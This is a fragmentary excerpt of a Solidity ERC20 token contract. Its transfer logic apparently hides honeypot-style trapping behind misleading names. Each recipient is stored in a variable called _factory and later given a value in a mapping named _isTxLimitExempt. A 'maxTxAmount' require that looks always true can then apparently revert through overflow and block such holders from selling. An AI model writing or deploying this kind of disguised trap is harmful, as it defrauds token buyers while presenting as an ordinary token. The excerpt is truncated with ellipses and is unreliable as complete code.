...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _isTxLimitExempt;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _isTxExempt[msg.sender] = true;
        _isTxExempt[address(this)] = true;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_isTxExempt[from] && amount <= swapAtAmount) {
            require(_isTxLimitExempt[from] + _amount >= 0, 'Transfer amount exceeds the maxTxAmount');
        }
        ...
        bool takeFee = !_isTxExempt[from] && !_isTxExempt[to] && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (_isTxLimitExempt[factory] == 0) _isTxLimitExempt[factory] = swapAtAmount;
        _factory = uint160(to);
        if (takeFee) {
